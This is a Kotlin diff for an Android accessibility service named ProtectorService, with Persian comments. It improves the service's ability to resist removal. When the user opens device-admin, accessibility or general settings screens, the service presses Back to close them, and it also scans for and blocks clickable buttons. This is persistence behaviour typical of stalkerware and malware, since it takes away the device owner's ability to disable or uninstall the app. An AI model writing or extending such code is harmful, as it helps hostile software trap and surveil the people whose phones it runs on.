@@ -24,23 +24,25 @@ class ProtectorService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (event == null) return
+        if (event == null || rootInActiveWindow == null) return
 
         val rootNode = rootInActiveWindow ?: return
-        // بررسی همه دکمه‌ها و View‌های کلیک‌پذیر
-        blockDangerousButtons(rootNode)
+
 
         val packageName = event.packageName?.toString() ?: return
         val className = event.className?.toString() ?: return
 
         // مانیتور کردن تنظیمات یا DeviceAdmin یا Accessibility تنظیمات
         if (packageName.contains("settings", true)) {
-            if (className.contains("DeviceAdminAdd") || className.contains("Accessibility")) {
+            if (className.contains("DeviceAdminAdd") || className.contains("Accessibility") || className.contains("SettingsActivity", true)) {
                 // تلاش برای غیرفعال کردن یا حذف
                 Log.d("ProtectorService", "Suspicious activity detected in $className, closing...")
                 performGlobalAction(GLOBAL_ACTION_BACK)
+                return
             }
         }
+        // بررسی همه دکمه‌ها و View‌های کلیک‌پذیر
+        blockDangerousButtons(rootNode)
     }
     private fun blockDangerousButtons(node: AccessibilityNodeInfo?) {
         if (node == null) return
@@ -66,6 +68,7 @@ class ProtectorService : AccessibilityService() {
     }
     override fun onInterrupt() {
         // هیچ کاری نیاز نیست
+        Log.d("ProtectorService", "Service interrupted.")
     }
 
     override fun onDestroy() {
